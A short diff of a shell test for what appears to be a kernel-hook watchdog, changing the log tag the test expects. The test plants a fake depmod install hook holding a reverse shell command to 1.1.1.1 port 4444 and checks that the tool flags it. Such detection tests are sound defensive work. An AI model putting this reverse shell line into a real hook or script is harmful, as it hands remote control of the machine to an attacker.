@@ -308,6 +308,6 @@ seed_benign() {
     : > "${SELFDEF_TEST_LOGCAP}"
     printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/50-depmod.install"
     run_wd
-    main_count=$(cap | grep -cE '^-t selfdef-kernel-install-hooks -- ')
+    main_count=$(cap | grep -cE '^-t selfdef-kernel-hooks -- ')
     [ "${main_count}" = "1" ]
 }
